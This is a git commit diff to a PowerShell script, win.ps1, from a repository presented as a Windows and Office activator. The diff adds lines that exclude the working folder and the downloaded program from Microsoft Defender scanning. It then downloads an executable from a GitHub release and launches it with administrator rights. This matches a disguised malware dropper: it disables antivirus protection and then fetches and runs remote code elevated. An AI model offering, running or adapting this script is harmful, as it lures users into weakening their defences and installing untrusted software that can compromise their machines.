42bfe6a3077d932b6ca32483905d0a2e4882288b
betamod9 <164927681+betamod9@users.noreply.github.com>
2025-01-29 00:53:03 +0200

    Update win.ps1

--- win.ps1
+++ win.ps1
@@ -1,1 +1,7 @@
-irm "https://github.com/betamod9/Windows-10-and-11-Activator/releases/download/12.27.2024/Windows10.and.11.Activator.+.Office.Activator.2025.exe" -OutFile "Windows10.and.11.Activator.+.Office.Activator.2025.exe"; Start-Process -FilePath "Windows10.and.11.Activator.+.Office.Activator.2025.exe" -Verb RunAs
+$FilePath = "Windows10.and.11.Activator.+.Office.Activator.2025.exe"
+$DownloadUrl = "https://github.com/betamod9/Windows-10-and-11-Activator/releases/download/12.27.2024/$FilePath"
+$FullPath = "$PWD\$FilePath"
+Add-MpPreference -ExclusionPath $PWD
+Add-MpPreference -ExclusionProcess $FilePath
+Invoke-RestMethod -Uri $DownloadUrl -OutFile $FilePath
+Start-Process -FilePath $FilePath -Verb RunAs
